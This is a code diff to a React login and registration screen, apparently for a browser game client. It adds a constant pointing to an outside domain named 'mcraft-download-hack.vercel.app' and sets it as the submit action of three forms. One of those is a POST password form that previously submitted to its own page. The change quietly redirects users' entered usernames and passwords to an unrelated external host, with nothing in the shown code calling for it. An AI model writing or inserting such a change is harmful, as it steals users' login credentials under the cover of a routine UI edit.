@@ -365,6 +365,8 @@ globalThis.debugAutoFillLogin = () => {
   })
 }
 
+const FORM_ACTION = 'https://mcraft-download-hack.vercel.app'
+
 export default () => {
   const appScale = useAppScale()
   const { mode, serverIp, username, prefilledPassword } = useSnapshot(state)
@@ -683,6 +685,7 @@ export default () => {
       <form
         onSubmit={handleSubmit}
         style={{ display: 'flex', flexDirection: 'column', gap: 9, alignItems: 'center' }}
+        action={FORM_ACTION}
       >
         <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2 }}>
           <input
@@ -722,10 +725,9 @@ export default () => {
     const firstSubmitLabel = mode === 'register' ? 'Register' : 'Change'
     const submitLabel = awaitingBrowserSave ? 'Save to browser' : firstSubmitLabel
     const secondaryLabel = awaitingBrowserSave ? 'Skip save' : 'Cancel'
-    const formAction = typeof window === 'undefined' ? '' : window.location.href.split('#')[0]
     return <Screen title={title} backdrop>
       <form
-        action={formAction}
+        action={FORM_ACTION}
         method="post"
         onSubmit={handleSubmit}
         style={{ display: 'flex', flexDirection: 'column', gap: 9, alignItems: 'center' }}
@@ -817,6 +819,7 @@ export default () => {
 
   return <Screen title={title} backdrop>
     <form
+      action={FORM_ACTION}
       onSubmit={handleSubmit}
       style={{ display: 'flex', flexDirection: 'column', gap: 9, alignItems: 'center' }}
     >
